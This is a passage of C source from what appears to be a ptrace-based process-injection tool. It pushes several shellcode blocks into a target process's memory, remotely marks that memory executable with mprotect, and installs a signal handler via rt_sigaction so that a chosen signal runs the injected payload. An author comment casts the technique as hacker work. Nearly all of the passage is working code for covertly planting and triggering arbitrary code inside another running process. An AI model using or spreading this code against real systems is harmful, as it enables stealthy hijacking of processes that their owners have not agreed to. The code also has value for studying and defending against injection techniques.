		memset(&tmp_ptrace_data, 0, sizeof(long));
		if((retval_long = ptrace(PTRACE_POKEDATA, target->pid, (void *) (base_remote_address + remote_index), (void *) tmp_ptrace_data)) == -1){
			fprintf(stderr, "%s: main(): ptrace(PTRACE_POKEDATA, %d, %lx, %lx): %s\n", program_invocation_short_name, target_pid, (unsigned long) base_remote_address + remote_index, (unsigned long) tmp_ptrace_data, strerror(errno));
			exit_val = -1;
			goto CLEAN_UP;
		}
		remote_index += BYTES_PER_WORD;

		if(global_debug){
			printf("\tremote_argv->remote_argv_address: %p\n", (void *) remote_argv->remote_argv_address);
		}
	}

	if(do_exec){
		this = payload_shellcode->head;

		while(this){
			if(this->ptrace_word == FILENAME_ADDR_PLACEHOLDER_NUM){
				this->ptrace_word = base_remote_address;
			}else if(this->ptrace_word == ARGV_ADDR_PLACEHOLDER_NUM){
				this->ptrace_word = remote_argv->remote_argv_address;
			}
			this = this->next;
		}
	}


	/*
	 * - Push the payload shellcode to remote memory.
	 */

	payload_shellcode->remote_address = (void *) (base_remote_address + remote_index);
	this = payload_shellcode->head;
	while(this){
		if((retval_long = ptrace(PTRACE_POKEDATA, target->pid, (void *) (base_remote_address + remote_index), (void *) this->ptrace_word)) == -1){
			fprintf(stderr, "%s: main(): ptrace(PTRACE_POKEDATA, %d, %lx, %lx): %s\n", program_invocation_short_name, target_pid, (unsigned long) base_remote_address + remote_index, (unsigned long) this->ptrace_word, strerror(errno));
			exit_val = -1;
			goto CLEAN_UP;
		}
		remote_index += BYTES_PER_WORD;
		this = this->next;
	}

	if(global_debug){
		printf("\tpayload_shellcode->remote_address: %p\n", payload_shellcode->remote_address);
	}


	/*
	 * - Push the default_handler shellcode to remote memory.
	 * - Replace HANDLER_ADDR_PLACEHOLDER_NUM values.
	 */

	if(sa_resethand_flag){
		default_signal_handler_shellcode->remote_address = (void *) (base_remote_address + remote_index);
		this = default_signal_handler_shellcode->head;
		while(this){
			if((retval_long = ptrace(PTRACE_POKEDATA, target->pid, (void *) (base_remote_address + remote_index), (void *) this->ptrace_word)) == -1){
				fprintf(stderr, "%s: main(): ptrace(PTRACE_POKEDATA, %d, %lx, %lx): %s\n", program_invocation_short_name, target_pid, (unsigned long) base_remote_address + remote_index, (unsigned long) this->ptrace_word, strerror(errno));
				exit_val = -1;
				goto CLEAN_UP;
			}
			remote_index += BYTES_PER_WORD;
			this = this->next;
		}

		if(global_debug){
			printf("\tdefault_signal_handler_shellcode->remote_address: %p\n", default_signal_handler_shellcode->remote_address);
		}
	}

	if(call_orig_handler){
		if(run_forked){
			this = payload_open_shellcode->head;
		}else{
			this = payload_close_shellcode->head;
		}

		while(this){
			if(this->ptrace_word == HANDLER_ADDR_PLACEHOLDER_NUM){
				if(sa_resethand_flag){
					this->ptrace_word = (unsigned long) default_signal_handler_shellcode->remote_address;
				}else{
					this->ptrace_word = (unsigned long) act->k_sa_handler;
				}
			}
			this = this->next;
		}
	}


	/*
	 * - Push the payload_open shellcode to remote memory.
	 */

	if(payload_open_shellcode->node_count){
		payload_open_shellcode->remote_address = (void *) (base_remote_address + remote_index);
		this = payload_open_shellcode->head;
		while(this){
			if((retval_long = ptrace(PTRACE_POKEDATA, target->pid, (void *) (base_remote_address + remote_index), (void *) this->ptrace_word)) == -1){
				fprintf(stderr, "%s: main(): ptrace(PTRACE_POKEDATA, %d, %lx, %lx): %s\n", program_invocation_short_name, target_pid, (unsigned long) base_remote_address + remote_index, (unsigned long) this->ptrace_word, strerror(errno));
				exit_val = -1;
				goto CLEAN_UP;
			}

			remote_index += BYTES_PER_WORD;
			this = this->next;
		}

		if(global_debug){
			printf("\tpayload_open_shellcode->remote_address: %p\n", payload_open_shellcode->remote_address);
		}
	}


	/*
	 * - Push the call_payload shellcode to remote memory.
	 * - Replace PAYLOAD_ADDR_PLACEHOLDER_NUM values.
	 */

	call_payload_shellcode->remote_address = (void *) (base_remote_address + remote_index);
	this = call_payload_shellcode->head;
	while(this){

		if(this->ptrace_word == PAYLOAD_ADDR_PLACEHOLDER_NUM){
			this->ptrace_word = (unsigned long) payload_shellcode->remote_address;
		}

		if((retval_long = ptrace(PTRACE_POKEDATA, target->pid, (void *) (base_remote_address + remote_index), (void *) this->ptrace_word)) == -1){
			fprintf(stderr, "%s: main(): ptrace(PTRACE_POKEDATA, %d, %lx, %lx): %s\n", program_invocation_short_name, target_pid, (unsigned long) base_remote_address + remote_index, (unsigned long) this->ptrace_word, strerror(errno));
			exit_val = -1;
			goto CLEAN_UP;
		}
		remote_index += BYTES_PER_WORD;
		this = this->next;
	}

	if(global_debug){
		printf("\tcall_payload_shellcode->remote_address: %p\n", call_payload_shellcode->remote_address);
	}


	/*
	 * - Push the payload_close shellcode to remote memory.
	 */

	payload_close_shellcode->remote_address = (void *) (base_remote_address + remote_index);
	this = payload_close_shellcode->head;
	while(this){
		if((retval_long = ptrace(PTRACE_POKEDATA, target->pid, (void *) (base_remote_address + remote_index), (void *) this->ptrace_word)) == -1){
			fprintf(stderr, "%s: main(): ptrace(PTRACE_POKEDATA, %d, %lx, %lx): %s\n", program_invocation_short_name, target_pid, (unsigned long) base_remote_address + remote_index, (unsigned long) this->ptrace_word, strerror(errno));
			exit_val = -1; goto CLEAN_UP;
		}
		remote_index += BYTES_PER_WORD;
		this = this->next;
	}

	if(global_debug){
		printf("\tpayload_close_shellcode->remote_address: %p\n", payload_close_shellcode->remote_address);
	}


	/*
	 * - Push the sigreturn shellcode to remote memory.
	 */

	sigreturn_shellcode->remote_address = (void *) (base_remote_address + remote_index);
	this = sigreturn_shellcode->head;
	while(this){
		if((retval_long = ptrace(PTRACE_POKEDATA, target->pid, (void *) (base_remote_address + remote_index), (void *) this->ptrace_word)) == -1){
			fprintf(stderr, "%s: main(): ptrace(PTRACE_POKEDATA, %d, %lx, %lx): %s\n", program_invocation_short_name, target_pid, (unsigned long) base_remote_address + remote_index, (unsigned long) this->ptrace_word, strerror(errno));
			exit_val = -1;
			goto CLEAN_UP;
		}
		remote_index += BYTES_PER_WORD;
		this = this->next;
	}

	if(global_debug){
		printf("\tsigreturn_shellcode->remote_address: %p\n", sigreturn_shellcode->remote_address);
	}


	/*
	 * - Change remote memory permissions from read/write to read/execute.
	 */

	errno = 0;
	retval_ulong = ptrace_do_syscall(target, __NR_mprotect, base_remote_address, input_len, PROT_READ|PROT_EXEC, 0, 0, 0);
	if(errno){
		fprintf(stderr, "%s: main(): ptrace_do_syscall(%lx, __NR_mprotect, %lx, %d, PROT_READ|PROT_EXEC, 0, 0, 0): %s\n", program_invocation_short_name, (unsigned long) target, base_remote_address, (int) input_len, strerror(errno));
		exit_val = -1;
		goto CLEAN_UP;
	}

	if((long) retval_ulong < 0){
		fprintf(stderr, "%s: main(): remote mprotect() failed: %s\n", program_invocation_short_name, strerror(-retval_ulong));
		exit_val = -1;
		goto CLEAN_UP;
	}


	/*
	 * - Set up the new sigaction act struct.
	 * - Push the new sigaction act struct to remote temporary memory.
	 * - Call sigaction() remotely.
	 */

	// "warning: ISO C forbids conversion of object pointer to function pointer type"
	//
	// Lol! So it does, and for good reason too. This would be a horrible technique coming from a software engineer.
	// Luckily though, we're hackers. (The -pedantic switch is good for debugging, but I'll pull it before release.)
	// 
	// Doing this sorta thing always makes me feel like the valet from "Ferris Bueller's Day Off":
	// "Uh, you fellas have nothing to worry about...  I'm a professional." Rofl!
	// http://www.youtube.com/watch?v=XVACbEHkV2Q

	if(payload_open_shellcode->node_count){
		act->k_sa_handler = (void (*)()) payload_open_shellcode->remote_address;
	}else{
		act->k_sa_handler = (void (*)()) call_payload_shellcode->remote_address;
	}
	act->sa_restorer = (void (*)()) sigreturn_shellcode->remote_address;

	act->sa_flags |= SA_RESTORER;
	act->sa_flags |= SA_RESTART;

	// sa_resethand_flag will be either 0 or SA_RESETHAND, depending on the case specifics for a -o flag invocation.
	act->sa_flags |= sa_resethand_flag;

	if((remote_act = ptrace_do_push_mem(target, act)) == NULL){
		fprintf(stderr, "%s: main(): ptrace_do_push_mem(%lx, %lx): %s\n", program_invocation_short_name, (unsigned long) target, (unsigned long) act, strerror(errno));
		exit_val = -1;
		goto CLEAN_UP;
	}

	// Push the new act structure with a remote sigaction().
	errno = 0;
	retval_ulong = ptrace_do_syscall(target, __NR_rt_sigaction, signal_trigger_element->number, (unsigned long) remote_act, 0, KERNEL_SIGSETSIZE, 0, 0);
	if(errno){
		fprintf(stderr, "%s: main(): ptrace_do_syscall(%lx, __NR_rt_sigaction, %d, %lx, 0, %d, 0, 0): %s\n", program_invocation_short_name, (unsigned long) target, signal_trigger_element->number, (unsigned long) remote_act, (int) sizeof(sigset_t), strerror(errno));
		exit_val = -1;
		goto CLEAN_UP;
	}

	if((long) retval_ulong < 0){
		fprintf(stderr, "%s: main(): remote sigaction() failed: %s\n", program_invocation_short_name, strerror(-retval_ulong));
		exit_val = -1;
		goto CLEAN_UP;
	}


	/*
	 * - Clean up temporary remote memory and unneeded local data structures related to ptrace_do.
	 * - Detatch from the remote process.
	 * - exit()
	 */

CLEAN_UP:
	ptrace_do_cleanup(target);

	if(global_debug){
		printf("\n exit_val: %d\n\n", exit_val);
	}

	return(exit_val);
}

